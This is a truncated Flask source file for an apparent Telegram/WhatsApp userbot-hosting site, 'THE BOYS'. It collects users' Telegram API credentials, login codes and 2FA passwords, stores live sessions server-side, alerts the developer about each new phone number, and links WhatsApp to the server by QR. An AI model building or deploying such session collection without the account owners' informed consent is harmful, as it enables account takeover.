import threading
import asyncio
import uuid
import logging
import sys
import os
import signal
import requests
import time
import json
from flask import Flask, jsonify, request
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from shared import *

# ====== إعدادات WhatsApp ======
WHATSAPP_BASE_URL = "http://127.0.0.1:8080"  # نفس منفذ Flask

# ====== إعدادات Flask ======
app = Flask(__name__)

# ====== نقطة فحص WhatsApp ======
@app.route('/debug/status')
def debug_status():
    """فحص حالة جميع الخدمات"""
    try:
        # محاولة جلب حالة واتساب من ملف
        with open('./wa_users.json', 'r') as f:
            users = json.load(f)
        whatsapp_status = "running" if users else "waiting"
    except:
        whatsapp_status = "not_running"
    
    return jsonify({
        "flask_port": os.environ.get('PORT', '8080'),
        "whatsapp_status": whatsapp_status,
        "whatsapp_url": WHATSAPP_BASE_URL,
        "clients": len(active_clients)
    })

# ====== Routes ======

@app.route('/')
def home():
    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>THE BOYS</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap');

  :root {
    --bg:#0A0A0B; --panel:#131316; --panel-hi:#18181C;
    --line:rgba(255,255,255,0.08); --line-hi:rgba(255,255,255,0.16);
    --text:#F2F2F3; --text-dim:rgba(242,242,243,0.55); --text-faint:rgba(242,242,243,0.32);
    --accent:#5B8CFF; --accent-dim:rgba(91,140,255,0.12);
    --ok:#3FB871; --err:#E5534B;
    --r:10px; --r2:16px;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { background:var(--bg); }
  body {
    font-family:'Inter',-apple-system,BlinkMacSystemFont,system-ui,sans-serif;
    color:var(--text); min-height:100vh;
    display:flex; align-items:center; justify-content:center;
    padding:24px; -webkit-font-smoothing:antialiased;
  }

  .wrap { width:100%; max-width:420px; display:flex; flex-direction:column; gap:16px; }

  .nav-tabs {
    display:flex; gap:8px; margin-bottom:4px;
  }
  .nav-tab {
    flex:1; padding:10px; text-align:center; border-radius:var(--r);
    font-size:13px; font-weight:600; cursor:pointer; text-decoration:none;
    background:var(--panel); border:1px solid var(--line); color:var(--text-dim);
    transition:all .15s;
  }
  .nav-tab:hover { border-color:var(--line-hi); color:var(--text); }
  .nav-tab.active { background:var(--text); color:#0A0A0B; border-color:var(--text); }

  .hd { text-align:center; margin-bottom:4px; }
  .mark {
    width:48px; height:48px; margin:0 auto 18px; border-radius:12px;
    background:var(--panel-hi); border:1px solid var(--line);
    display:flex; align-items:center; justify-content:center;
  }
  .mark svg { width:22px; height:22px; }
  .hd h1 { font-size:19px; font-weight:600; letter-spacing:-0.2px; margin-bottom:6px; }
  .hd p { font-size:13px; color:var(--text-faint); line-height:1.5; }

  .card {
    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2);
    padding:24px; position:relative;
  }

  .step-head {
    display:flex; align-items:center; justify-content:space-between; margin-bottom:20px;
  }
  .step-text {
    font-family:'JetBrains Mono',monospace; font-size:11px; font-weight:500;
    color:var(--text-faint); text-transform:uppercase; letter-spacing:.8px;
  }

  .back-btn {
    display:inline-flex; align-items:center; gap:5px;
    background:none; border:none; color:var(--text-dim); font-size:13px; font-weight:500;
    cursor:pointer; padding:2px 0; transition:color .15s;
  }
  .back-btn:hover { color:var(--text); }
  .back-btn svg { width:14px; height:14px; }

  .field { margin-bottom:14px; position:relative; }
  .field label {
    display:block; font-size:12.5px; font-weight:500; color:var(--text-dim); margin-bottom:6px;
  }
  .input-row { position:relative; display:flex; align-items:center; }
  .field input {
    width:100%; padding:11px 42px 11px 12px; background:var(--panel-hi);
    border:1px solid var(--line); border-radius:var(--r); color:var(--text);
    font-size:14.5px; font-weight:500; font-family:inherit; outline:none;
    transition:border-color .15s, background .15s;
  }
  .field input::placeholder { color:var(--text-faint); }
  .field input:focus { border-color:var(--accent); background:rgba(91,140,255,0.05); }
  #code {
    font-family:'JetBrains Mono',monospace; font-size:17px; font-weight:600; letter-spacing:5px;
  }

  .toggle-vis {
    position:absolute; right:8px; top:50%; transform:translateY(-50%);
    background:none; border:none; cursor:pointer; padding:6px; line-height:0;
    display:flex; align-items:center; justify-content:center;
    opacity:.45; transition:opacity .15s; width:32px; height:32px;
    z-index:2;
  }
  .toggle-vis:hover { opacity:.9; }
  .toggle-vis svg { width:16px; height:16px; stroke:var(--text-dim); stroke-width:2; fill:none; stroke-linecap:round; stroke-linejoin:round; }

  .btn {
    width:100%; padding:12px; border:none; border-radius:var(--r); font-size:14px; font-weight:600;
    font-family:'Inter',sans-serif; cursor:pointer; position:relative; overflow:hidden;
    display:flex; align-items:center; justify-content:center; gap:8px;
    transition:opacity .15s, transform .1s; margin-top:4px;
  }
  .btn:active { transform:scale(.985); }
  .btn-primary { background:var(--text); color:#0A0A0B; }
  .btn-primary:hover { opacity:.9; }
  .btn .prog-bar {
    position:absolute; bottom:0; left:0; height:2px; background:rgba(0,0,0,.25); width:0%; transition:width .05s linear;
  }
  .btn.loading { pointer-events:none; color:transparent; }
  .btn.loading::before {
    content:''; position:absolute; top:50%; left:50%; width:16px; height:16px;
    margin:-8px 0 0 -8px; border:2px solid rgba(0,0,0,.2);
    border-top-color:#0A0A0B; border-radius:50%; animation:spin .7s linear infinite;
  }

  .result {
    display:none; margin-top:12px; padding:10px 13px; border-radius:var(--r);
    font-size:12.5px; font-weight:500; text-align:center;
  }
  .result.show { display:block; }
  .result.ok  { background:rgba(63,184,113,0.1); border:1px solid rgba(63,184,113,0.25); color:var(--ok); }
  .result.err { background:rgba(229,83,75,0.1); border:1px solid rgba(229,83,75,0.25); color:var(--err); }

  .info-card {
    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2); padding:18px 20px;
  }
  .info-card h3 { font-size:12.5px; font-weight:600; color:var(--text-dim); margin-bottom:10px; }
  .info-card p { font-size:12.5px; color:var(--text-faint); line-height:1.7; }
  .info-card strong { color:var(--text-dim); font-weight:600; }
  .info-card a {
    display:inline-flex; align-items:center; gap:6px; margin-top:12px; padding:9px 12px;
    background:var(--panel-hi); border:1px solid var(--line); border-radius:8px;
    color:var(--text-dim); font-size:12.5px; font-weight:600; text-decoration:none; transition:all .15s;
  }
  .info-card a:hover { border-color:var(--line-hi); color:var(--text); }
  .info-card a svg { width:14px; height:14px; }

  .footer-links {
    display:flex; gap:8px; justify-content:center; margin-top:4px;
  }
  .footer-links a {
    flex:1; display:inline-flex; align-items:center; justify-content:center; gap:6px;
    padding:9px 12px; background:var(--panel); border:1px solid var(--line);
    border-radius:10px; color:var(--text-dim); font-size:12px; font-weight:500;
    text-decoration:none; transition:all .15s;
  }
  .footer-links a:hover { border-color:var(--line-hi); color:var(--text); background:var(--panel-hi); }
  .footer-links a svg { width:14px; height:14px; flex-shrink:0; }

  .hidden { display:none; }

  @keyframes spin { to { transform:rotate(360deg); } }

  @media (prefers-reduced-motion: reduce) { * { animation:none !important; transition:none !important; } }
</style>
</head>
<body>

<div class="wrap">
  <div class="nav-tabs">
    <a href="/" class="nav-tab active">Telegram</a>
    <a href="/whatsapp" class="nav-tab">WhatsApp</a>
  </div>

  <div class="hd">
    <div class="mark">
      <svg viewBox="0 0 24 24" fill="var(--text)" stroke="none">
        <polygon points="12,2 15.09,8.26 22,9.27 17,14.14 18.18,21.02 12,17.77 5.82,21.02 7,14.14 2,9.27 8.91,8.26"/>
      </svg>
    </div>
    <h1>THE BOYS</h1>
    <p>Telethon By Vought</p>
  </div>

  <div class="card">
    <div id="step1">
      <div class="step-head"><span class="step-text">Step 1 of 2</span></div>
      <div class="field">
        <label>API ID</label>
        <div style="position:relative;">
          <input id="api_id" type="password" placeholder="12345678" inputmode="numeric" autocomplete="off">
          <button class="toggle-vis" onclick="toggleVisibility('api_id', this)" title="Show/Hide">
            <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
            <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <div class="field">
        <label>API Hash</label>
        <div style="position:relative;">
          <input id="api_hash" type="password" placeholder="0123456789abcdef..." autocomplete="off">
          <button class="toggle-vis" onclick="toggleVisibility('api_hash', this)" title="Show/Hide">
            <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
            <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <div class="field">
        <label>Phone Number</label>
        <div style="position:relative;">
          <input id="phone" type="password" placeholder="+201234567890" inputmode="tel" autocomplete="off">
          <button class="toggle-vis" onclick="toggleVisibility('phone', this)" title="Show/Hide">
            <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
            <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <button class="btn btn-primary" id="sendBtn" onclick="sendCode()">
        <span class="btn-label">Send code</span>
        <div class="prog-bar" id="prog1"></div>
      </button>
    </div>

    <div id="step2" class="hidden">
      <div class="step-head">
        <button class="back-btn" onclick="backToStep1()">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
          Back
        </button>
        <span class="step-text">Step 2 of 2</span>
      </div>
      <div class="field">
        <label>Login code</label>
        <div style="position:relative;">
          <input id="code" type="password" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
          <button class="toggle-vis" onclick="toggleVisibility('code', this)" title="Show/Hide">
            <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
            <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <div class="field">
        <label>2FA password <span style="color:var(--text-faint);font-weight:400;">(optional)</span></label>
        <div style="position:relative;">
          <input id="password" type="password" placeholder="........" autocomplete="current-password">
          <button class="toggle-vis" onclick="toggleVisibility('password', this)" title="Show/Hide">
            <svg class="eye-off" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
            <svg class="eye-on" viewBox="0 0 24 24" style="display:none;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
      </div>
      <button class="btn btn-primary" id="verifyBtn" onclick="verify()">
        <span class="btn-label">Verify and activate</span>
        <div class="prog-bar" id="prog2"></div>
      </button>
    </div>

    <div class="result" id="result"></div>
  </div>

  <div class="info-card">
    <h3>Where do I get these credentials?</h3>
    <p>Visit <strong>my.telegram.org</strong>, sign in, open <strong>API development tools</strong>, and create an app to get your <strong>api_id</strong> and <strong>api_hash</strong>.</p>
    <a href="https://my.telegram.org/apps" target="_blank">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
      Open my.telegram.org
    </a>
  </div>

  <div class="footer-links">
    <a href="https://t.me/i_v_k_i" target="_blank">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
      Source Channel
    </a>
    <a href="https://t.me/J0E_3" target="_blank">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      Developer
    </a>
  </div>
</div>

<script>
const $ = id => document.getElementById(id);
let currentPhone = '';

function showResult(msg, ok) {
  const r = $('result');
  r.className = 'result show ' + (ok ? 'ok' : 'err');
  r.textContent = msg;
}

function toggleVisibility(fieldId, btn) {
  const input = $(fieldId);
  const eyeOff = btn.querySelector('.eye-off');
  const eyeOn = btn.querySelector('.eye-on');
  if (input.type === 'password') {
    input.type = 'text';
    if (eyeOff) eyeOff.style.display = 'none';
    if (eyeOn) eyeOn.style.display = 'block';
  } else {
    input.type = 'password';
    if (eyeOff) eyeOff.style.display = 'block';
    if (eyeOn) eyeOn.style.display = 'none';
  }
}

function runProgress(barId, duration, onDone) {
  const bar = $(barId);
  let w = 0;
  const step = 100 / (duration / 50);
  bar.style.width = '0%';
  const iv = setInterval(() => {
    w = Math.min(w + step + Math.random() * step * .5, 92);
    bar.style.width = w + '%';
    if (w >= 92) clearInterval(iv);
  }, 50);
  return { finish: () => {
    clearInterval(iv);
    bar.style.transition = 'width .3s ease';
    bar.style.width = '100%';
    setTimeout(() => { bar.style.width = '0%'; bar.style.transition = 'width .05s linear'; if(onDone) onDone(); }, 300);
  }};
}

async function sendCode() {
  const api_id = $('api_id').value.trim();
  const api_hash = $('api_hash').value.trim();
  const phone = $('phone').value.trim();
  if (!api_id || !api_hash || !phone) { showResult('Please complete all fields.', false); return; }
  const btn = $('sendBtn');
  btn.classList.add('loading');
  const prog = runProgress('prog1', 3000);
  try {
    const fd = new FormData();
    fd.append('api_id', api_id);
    fd.append('api_hash', api_hash);
    fd.append('phone', phone);
    const res = await fetch('/api/send_code', { method:'POST', body:fd });
    const data = await res.json();
    prog.finish();
    if (data.status === 'code_sent' || data.status === 'already_active') {
      currentPhone = phone;
      if (data.status === 'code_sent') {
        $('step1').classList.add('hidden');
        $('step2').classList.remove('hidden');
        showResult('Code sent — check your Telegram app.', true);
      } else {
        showResult('Session already active.', true);
      }
    } else {
      showResult(data.message || 'Something went wrong.', false);
    }
  } catch(e) {
    prog.finish();
    showResult('Connection error. Please try again.', false);
  } finally {
    btn.classList.remove('loading');
  }
}

async function verify() {
  const code = $('code').value.trim();
  const password = $('password').value;
  if (!code) { showResult('Enter the verification code.', false); return; }
  const btn = $('verifyBtn');
  btn.classList.add('loading');
  const prog = runProgress('prog2', 3500);
  try {
    const fd = new FormData();
    fd.append('phone', currentPhone);
    fd.append('code', code);
    fd.append('password', password);
    const res = await fetch('/api/verify', { method:'POST', body:fd });
    const data = await res.json();
    prog.finish();
    if (data.status === 'success') {
      showResult('Account activated.', true);
      setTimeout(() => { location.reload(); }, 2500);
    } else {
      showResult(data.message || 'Verification failed', false);
    }
  } catch(e) {
    prog.finish();
    showResult('Connection error. Please try again.', false);
  } finally {
    btn.classList.remove('loading');
  }
}

function backToStep1() {
  $('step2').classList.add('hidden');
  $('step1').classList.remove('hidden');
  $('result').className = 'result';
}

document.addEventListener('keydown', e => {
  if (e.key !== 'Enter') return;
  if (!$('step2').classList.contains('hidden')) verify();
  else if (!$('step1').classList.contains('hidden')) sendCode();
});
</script>
</body>
</html>"""

@app.route('/whatsapp')
def whatsapp_page():
    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>WhatsApp · THE BOYS</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap');

  :root {
    --bg:#0A0A0B; --panel:#131316; --panel-hi:#18181C;
    --line:rgba(255,255,255,0.08); --line-hi:rgba(255,255,255,0.16);
    --text:#F2F2F3; --text-dim:rgba(242,242,243,0.55); --text-faint:rgba(242,242,243,0.32);
    --accent:#25D366; --accent-dim:rgba(37,211,102,0.12);
    --ok:#3FB871; --err:#E5534B;
    --r:10px; --r2:16px;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { background:var(--bg); }
  body {
    font-family:'Inter',-apple-system,BlinkMacSystemFont,system-ui,sans-serif;
    color:var(--text); min-height:100vh;
    display:flex; align-items:center; justify-content:center;
    padding:24px; -webkit-font-smoothing:antialiased;
  }

  .wrap { width:100%; max-width:420px; display:flex; flex-direction:column; gap:16px; }

  .nav-tabs {
    display:flex; gap:8px; margin-bottom:4px;
  }
  .nav-tab {
    flex:1; padding:10px; text-align:center; border-radius:var(--r);
    font-size:13px; font-weight:600; cursor:pointer; text-decoration:none;
    background:var(--panel); border:1px solid var(--line); color:var(--text-dim);
    transition:all .15s;
  }
  .nav-tab:hover { border-color:var(--line-hi); color:var(--text); }
  .nav-tab.active { background:var(--text); color:#0A0A0B; border-color:var(--text); }

  .hd { text-align:center; margin-bottom:4px; }
  .mark {
    width:48px; height:48px; margin:0 auto 18px; border-radius:12px;
    background:rgba(37,211,102,0.1); border:1px solid rgba(37,211,102,0.2);
    display:flex; align-items:center; justify-content:center;
  }
  .mark svg { width:24px; height:24px; fill:#25D366; }
  .hd h1 { font-size:19px; font-weight:600; letter-spacing:-0.2px; margin-bottom:6px; }
  .hd p { font-size:13px; color:var(--text-faint); line-height:1.5; }

  .card {
    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2);
    padding:24px; position:relative; text-align:center;
  }

  #qr-section h3 { font-size:14px; font-weight:600; margin-bottom:16px; color:var(--text-dim); }
  #qr-container {
    width:220px; height:220px; margin:0 auto 16px;
    background:#fff; border-radius:12px; padding:8px;
    display:none; align-items:center; justify-content:center;
  }
  #qr-container.show { display:flex; }
  #qr-container img { width:100%; height:100%; }
  #qr-placeholder {
    width:220px; height:220px; margin:0 auto 16px;
    background:var(--panel-hi); border:2px dashed var(--line);
    border-radius:12px; display:flex; align-items:center; justify-content:center;
    color:var(--text-faint); font-size:13px;
  }

  #status-box {
    padding:10px 14px; border-radius:var(--r); font-size:13px; font-weight:500;
    margin-top:12px;
  }
  #status-box.waiting { background:rgba(255,255,255,0.03); color:var(--text-dim); }
  #status-box.ready { background:var(--accent-dim); color:var(--accent); }
  #status-box.connected { background:rgba(63,184,113,0.1); color:var(--ok); }
  #status-box.error { background:rgba(229,83,75,0.1); color:var(--err); }

  .btn {
    width:100%; padding:12px; border:none; border-radius:var(--r); font-size:14px; font-weight:600;
    font-family:'Inter',sans-serif; cursor:pointer; transition:opacity .15s;
    display:flex; align-items:center; justify-content:center; gap:8px;
  }
  .btn-primary { background:var(--text); color:#0A0A0B; }
  .btn-primary:hover { opacity:.9; }
  .btn-secondary { background:var(--panel-hi); color:var(--text-dim); border:1px solid var(--line); margin-top:8px; }
  .btn-secondary:hover { border-color:var(--line-hi); color:var(--text); }

  .info-card {
    background:var(--panel); border:1px solid var(--line); border-radius:var(--r2); padding:18px 20px;
  }
  .info-card h3 { font-size:12.5px; font-weight:600; color:var(--text-dim); margin-bottom:10px; }
  .info-card p { font-size:12.5px; color:var(--text-faint); line-height:1.7; }
  .info-card strong { color:var(--text-dim); font-weight:600; }

  .footer-links {
    display:flex; gap:8px; justify-content:center; margin-top:4px;
  }
  .footer-links a {
    flex:1; display:inline-flex; align-items:center; justify-content:center; gap:6px;
    padding:9px 12px; background:var(--panel); border:1px solid var(--line);
    border-radius:10px; color:var(--text-dim); font-size:12px; font-weight:500;
    text-decoration:none; transition:all .15s;
  }
  .footer-links a:hover { border-color:var(--line-hi); color:var(--text); background:var(--panel-hi); }
  .footer-links a svg { width:14px; height:14px; flex-shrink:0; }
</style>
</head>
<body>

<div class="wrap">
  <div class="nav-tabs">
    <a href="/" class="nav-tab">Telegram</a>
    <a href="/whatsapp" class="nav-tab active">WhatsApp</a>
  </div>

  <div class="hd">
    <div class="mark">
      <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
    </div>
    <h1>WhatsApp Setup</h1>
    <p>Scan the QR code to connect</p>
  </div>

  <div class="card">
    <div id="qr-section">
      <h3>Open WhatsApp on your phone</h3>
      <div id="qr-placeholder">Generating QR...</div>
      <div id="qr-container">
        <img id="qr-image" src="" alt="QR Code">
      </div>
      <p style="font-size:12px;color:var(--text-faint);margin-bottom:12px;">
        Settings → Linked Devices → Link a Device
      </p>
      <div id="status-box" class="waiting">Waiting for QR code...</div>
      <button class="btn btn-secondary" onclick="refreshQR()">Refresh QR</button>
    </div>
  </div>

  <div class="info-card">
    <h3>How to connect</h3>
    <p>1. Open <strong>WhatsApp</strong> on your phone</p>
    <p>2. Go to <strong>Settings</strong> → <strong>Linked Devices</strong></p>
    <p>3. Tap <strong>Link a Device</strong></p>
    <p>4. Scan the QR code above</p>
    <p style="margin-top:8px;color:var(--accent);">Or take a screenshot and scan from gallery</p>
  </div>

  <div class="footer-links">
    <a href="https://t.me/i_v_k_i" target="_blank">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.941z"/></svg>
      Source Channel
    </a>
    <a href="https://t.me/J0E_3" target="_blank">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      Developer
    </a>
  </div>
</div>

<script>
const userId = 'user_' + Date.now();
let pollInterval;

async function loadQR() {
    try {
        const res = await fetch('/api/whatsapp/qr/' + userId);
        const data = await res.json();
        
        const statusBox = document.getElementById('status-box');
        const qrPlaceholder = document.getElementById('qr-placeholder');
        const qrContainer = document.getElementById('qr-container');
        const qrImage = document.getElementById('qr-image');
        
        if (data.status === 'qr_ready' && data.qr) {
            qrPlaceholder.style.display = 'none';
            qrContainer.classList.add('show');
            qrImage.src = data.qr;
            statusBox.className = 'ready';
            statusBox.textContent = 'QR Ready - Scan with WhatsApp';
            clearInterval(pollInterval);
        } else if (data.status === 'connected') {
            qrPlaceholder.style.display = 'none';
            qrContainer.classList.add('show');
            statusBox.className = 'connected';
            statusBox.textContent = 'Connected successfully!';
            clearInterval(pollInterval);
            setTimeout(() => location.reload(), 3000);
        } else if (data.status === 'waiting') {
            statusBox.textContent = 'Generating QR...';
        }
    } catch(e) {
        console.error(e);
    }
}

async function startSession() {
    try {
        await fetch('/api/whatsapp/start', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({userId})
        });
    } catch(e) {
        console.error(e);
    }
}

function refreshQR() {
    clearInterval(pollInterval);
    document.getElementById('qr-placeholder').style.display = 'flex';
    document.getElementById('qr-container').classList.remove('show');
    document.getElementById('status-box').className = 'waiting';
    document.getElementById('status-box').textContent = 'Generating new QR...';
    startSession();
    pollInterval = setInterval(loadQR, 2000);
}

// Start
startSession();
pollInterval = setInterval(loadQR, 2000);
</script>
</body>
</html>"""

# ====== Health Check ======
@app.route('/health')
def health():
    return jsonify({"status": "ok", "clients": len(active_clients)}), 200

# ====== API: Send Code ======
@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    try:
        api_id = int(request.form.get('api_id'))
        api_hash = request.form.get('api_hash')
        phone = request.form.get('phone', '').strip()
        if not api_id or not api_hash or not phone:
            return jsonify({"status": "error", "message": "All fields required"}), 400

        if phone in active_clients:
            return jsonify({"status": "already_active", "message": "Session already active"}), 200

        async def _send():
            api_configs_storage[phone] = {'api_id': api_id, 'api_hash': api_hash}
            save_config(phone, api_id, api_hash)
            
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            
            if await client.is_user_authorized():
                active_clients[phone] = client
                client_me[phone] = await client.get_me()
                start_client_in_background(client, phone)
                await save_all_sessions()
                return jsonify({"status": "already_active", "message": "Session already active"})
            
            sent = await client.send_code_request(phone)
            pending_logins[phone] = (client, sent.phone_code_hash, api_id, api_hash)
            return jsonify({"status": "code_sent", "message": "Verification code sent"})
        
        return run_in_main(_send())
    except Exception as e:
        logger.error(f"Error sending code: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ====== API: Verify Code ======
@app.route('/api/verify', methods=['POST'])
def api_verify():
    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    password = request.form.get('password')
    
    if not phone or not code or phone not in pending_logins:
        return jsonify({"status": "error", "message": "Invalid session"}), 400

    async def _verify():
        client, phone_code_hash, api_id, api_hash = pending_logins[phone]
        try:
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                if not password:
                    return jsonify({"status": "error", "message": "2FA password required"}), 401
                await client.sign_in(password=password)
            
            if phone in active_clients:
                try:
                    await active_clients[phone].disconnect()
                except:
                    pass
                del active_clients[phone]
            
            active_clients[phone] = client
            client_me[phone] = await client.get_me()
            del pending_logins[phone]
            
            await save_all_sessions()
            start_client_in_background(client, phone)
            await notify_dev(f"New user activated: {phone}")
            
            return jsonify({"status": "success", "message": "Account activated successfully"})
        except Exception as e:
            logger.error(f"Verification error: {e}")
            return jsonify({"status": "error", "message": str(e)}), 400
    
    return run_in_main(_verify())

# ====== WhatsApp API ======
@app.route('/api/whatsapp/start', methods=['POST'])
def whatsapp_start():
    try:
        data = request.get_json()
        userId = data.get('userId', 'unknown')
        # استخدام Flask مباشرة بدلاً من subprocess
        return jsonify({"status": "started", "userId": userId})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/whatsapp/qr/<userId>')
def whatsapp_qr(userId):
    try:
        # محاولة قراءة QR من ملف
        if os.path.exists('./wa_qr.json'):
            with open('./wa_qr.json', 'r') as f:
                data = json.load(f)
                if data.get('qr'):
                    return jsonify({"qr": data['qr'], "status": "qr_ready"})
        return jsonify({"status": "waiting"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/whatsapp/status/<userId>')
def whatsapp_status(userId):
    try:
        if os.path.exists('./wa_users.json'):
